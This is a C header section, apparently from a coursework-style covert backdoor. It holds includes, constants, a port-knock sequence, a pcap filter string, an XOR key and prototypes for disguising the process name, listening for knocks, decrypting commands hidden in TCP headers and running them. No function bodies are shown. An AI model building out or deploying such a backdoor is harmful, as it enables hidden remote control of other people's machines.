#include <stdio.h>
#include <signal.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>   	// TCP Header definitions
#include <netinet/ip.h>    	// IP Header definitions
#include <sys/types.h>
#include <unistd.h>
#include <netinet/if_ether.h> 
#include <pcap.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <time.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <setjmp.h>
#include <signal.h>
#include <sys/prctl.h>

#define PKT_SIZE			4096
#define DEFAULT_TTL			128
#define DEFAULT_DST_PORT	8080
#define DEFAULT_SRC_IP		"192.168.0.25"
#define OPTIONS 			"?h:d:s:p:"
#define MAXLINE				80
#define XORVALUE            80
#define TRUE                1
#define FALSE               0
#define CMD					"tcp and src host 10.0.0.28" // and src host %s and src port %d"

int knockCode[] = {8080, 8081, 8082, 8083, 8084};
int ExitFlag;
int running;

// Globals
typedef struct
{
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;
    struct tcphdr tcp;
}pseudo_header;

typedef struct
{
    int RawSocket;
    char *DstHost;
    char *SrcHost;
    int dport;
    int sport;
}AddrInfo;

typedef struct
{
    pcap_t* nic_descr;
    bpf_u_int32 netp;
    char cmd[MAXLINE];
}PcapInfo;

// Function Prototypes
void* SendDatagram (void *);
void usage (char **argv);
unsigned short csum (unsigned short *, int);
void* ReceiveDatagram (void *);
char * resolve_host (const char *);
char * GetIPAddress (void);

//SPY
void disguise(char ** argv);
char* getDisguise();
void setDisguise(char * disguise, char ** argv);

//BACKJAKE
int main(int argc, char** argv);
void initializeAddress(AddrInfo **Addr_Ptr);
void initializeSocket(AddrInfo *Addr_Ptr);
void initializePcap(PcapInfo **pcap_ptr, AddrInfo *Addr_Ptr);
void setPcap(PcapInfo* pcap_ptr, AddrInfo *Addr_Ptr);
void initializeDoor(AddrInfo *Addr_Ptr);
void checkArgs(int argc, char **argv);
void usage(char ** argv);
void setupSignals();
void* knockListener(void* pcap_arg);
void executeCommand();
void spawnThread();
void setConfig();
char* readConfigFile();

//RECV
void* ReceiveDatagram (void *pcap_arg);
void pcapListen(PcapInfo * pcap_ptr);
void pcapCompile(PcapInfo * pcap_ptr, struct bpf_program * fp);
void pcapFilter(PcapInfo * pcap_ptr, struct bpf_program * fp);
int checkPacketSize();
void packetHandler(u_char *ptr_null, const struct pcap_pkthdr* pkthdr, const u_char* packet);
int PrintInHex(char *mesg, unsigned char *p, int len);
int authenticateClient(struct iphdr* ip_header, struct tcphdr* tcp_header);
int authenticated(int ip);
char* decryptPacket(struct tcphdr* tcp_header);
void runCommand(char* command);
void XOR();